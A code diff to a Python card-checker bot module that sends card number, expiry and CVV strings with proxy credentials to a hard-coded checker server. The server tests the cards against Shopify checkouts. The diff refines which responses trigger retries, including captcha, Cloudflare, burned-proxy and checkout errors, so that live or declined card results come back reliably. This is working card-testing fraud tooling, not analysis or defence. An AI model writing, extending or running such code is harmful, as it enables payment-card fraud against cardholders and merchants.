@@ -22,29 +22,46 @@ MAX_RETRIES = 5
 REQUEST_TIMEOUT = 120
 _CONNECT_TIMEOUT = 5
 
-# ── Dead / error indicators (agar response mein yeh aaye toh retry) ─────────
-_DEAD_INDICATORS = (
-    'receipt id is empty', 'handle is empty', 'product id is empty',
-    'tax amount is empty', 'payment method identifier is empty',
+# ── ONLY these responses trigger a retry (site/connection errors) ───────────
+# Card results (declined, cvv wrong, expired, 3ds, etc.) are NOT here.
+_RETRY_INDICATORS = (
+    # Shopify site / checkout business errors
+    'amount_too_small', 'amount too small',
+    'tax_new_tax_must_be_accepted',
+    'decision_rule_block',
+    'delivery_address2_required',
+    'delivery_delivery_line_detail_changed',
+    'merchandise_out_of_stock', 'all products sold out',
+    'validation_custom',
+    'site requires login', 'requires login',
+    'order subtotal is less than',
+    'handle is empty', 'product id is empty',
+    'receipt id is empty', 'tax amount is empty',
+    'payment method identifier is empty',
+    'failed to detect product', 'failed to create checkout',
+    'failed to tokenize card', 'failed to get proposal data',
+    'submit rejected', 'handle error',
+    'url rejected', 'malformed input',
+    'site dead', 'captcha_required', 'captcha required', 'site errors',
+    'no_session_token', 'tokenize_fail',
+    'access denied',
+    'empty reply from server',
+    'page_fetch_failed', 'page_error',
+
+    # HTTP / network / proxy errors
     'invalid url', 'error in 1st req', 'error in 1 req',
     'cloudflare', 'connection failed', 'timed out',
-    'access denied', 'tlsv1 alert', 'ssl routines',
+    'tlsv1 alert', 'ssl routines',
     'could not resolve', 'domain name not found',
     'name or service not known', 'openssl ssl_connect',
-    'empty reply from server', 'httperror504', 'http error',
+    'httperror504', 'http error',
     'timeout', 'unreachable', 'ssl error',
     '502', '503', '504', 'bad gateway', 'service unavailable',
     'gateway timeout', 'network error', 'connection reset',
-    'failed to detect product', 'failed to create checkout',
-    'failed to tokenize card', 'failed to get proposal data',
-    'submit rejected', 'handle error', 'http 404',
-    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
-    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
-    'site dead', 'captcha_required', 'captcha required', 'site errors',
-    'all products sold out', 'no_session_token', 'tokenize_fail',
+    'http 404', 'http 429', 'http 403',
     'proxy dead', 'proxy burned', 'change your proxy', 'proxy error',
     'authentication failed', 'could not connect', 'all nodes failed',
-    'error', 'failed', 'exception', 'unknown',
+    'unknown error',
 )
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -82,7 +99,6 @@ def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
     if not proxy_data:
         return None
 
-    # 1) Agar proxy_url pehle se bana hua hai (http://user:pass@host:port)
     existing = proxy_data.get("proxy_url")
     if existing and isinstance(existing, str) and existing.strip():
         url = existing.strip()
@@ -110,7 +126,6 @@ def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
                     return rest
         return rest
 
-    # 2) Fields se banao
     ip   = str(proxy_data.get("ip")   or "").strip()
     port = str(proxy_data.get("port") or "").strip()
     user = proxy_data.get("username")
@@ -159,11 +174,12 @@ def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
     return result
 
 
-def _is_dead(response_text: str) -> bool:
+def _should_retry(response_text: str) -> bool:
+    """Return True only for site/connection errors — NOT for card results."""
     if not response_text:
         return True
     rl = response_text.lower()
-    return any(ind in rl for ind in _DEAD_INDICATORS)
+    return any(ind in rl for ind in _RETRY_INDICATORS)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -174,10 +190,7 @@ async def _call_api(cc_str: str, proxy_str: str) -> dict:
     """Call the checker API. Returns dict or raises on failure."""
     sess = await _get_session()
 
-    # Exact format: http://5.175.222.144:8081/?cc|mm|yy|cvv&proxy=host:port:user:pass
-    # IMPORTANT: server expects literal '|' in query string.
-    # aiohttp/yarl encodes '|' → '%7C' by default which breaks the API.
-    # We use yarl.URL(encoded=True) to preserve raw characters.
+    # Server expects literal '|' — yarl.URL(encoded=True) prevents %7C encoding
     url_str = f"{API_BASE}/?{cc_str}&proxy={proxy_str}"
     url = URL(url_str, encoded=True)
 
@@ -192,7 +205,6 @@ async def _call_api(cc_str: str, proxy_str: str) -> dict:
             text = await resp.text()
             raise RuntimeError(f"HTTP {resp.status}: {text[:80]}")
 
-        # Pehle text lo, phir JSON parse karo (safe fallback)
         text = (await resp.text()).strip()
         try:
             data = json.loads(text)
@@ -209,7 +221,7 @@ async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -
     """
     Main entry point (same signature as before so bot.py needs ZERO changes).
     site_url is ignored — new API does not need it.
-    Retries up to MAX_RETRIES times on dead/error until proper response.
+    Retries up to MAX_RETRIES times on site/connection errors only.
     """
     proxy_str = _proxy_data_to_proxy_str(proxy_data)
     if not proxy_str:
@@ -237,23 +249,23 @@ async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -
                 f" | status={result.get('Status')} | resp={response_text[:60]}"
             )
 
-            # Agar response sahi hai (dead nahi), toh return immediately
-            if not _is_dead(response_text):
+            # ✅ Agar response card result hai (declined, live, cvv, etc.) → return immediately
+            if not _should_retry(response_text):
                 return result
 
-            # Dead response — save karo aur retry karo (agar attempt bachi ho)
+            # ⚠️ Site/connection error → retry karo (agar attempt bachi ho)
             last_result = result
-            last_err = f"Dead response: {response_text[:80]}"
-            log.warning(f"[bridge] dead response on attempt {attempt}, retrying...")
+            last_err = f"Retry-worthy response: {response_text[:80]}"
+            log.warning(f"[bridge] retry-trigger response on attempt {attempt}, retrying...")
 
             if attempt < MAX_RETRIES:
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.8)
 
         except Exception as e:
             last_err = f"{type(e).__name__}: {str(e)[:80]}"
             log.warning(f"[bridge] attempt {attempt}/{MAX_RETRIES} failed — {last_err}")
             if attempt < MAX_RETRIES:
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.8)
             else:
                 break
 
@@ -280,7 +292,7 @@ async def test_site(
     status = "working"
     if "proxy dead" in response_text.lower():
         status = "proxy_dead"
-    elif _is_dead(response_text):
+    elif _should_retry(response_text):
         status = "dead"
     return {"status": status, "response": response_text, "site": site_url, "price": price}
 
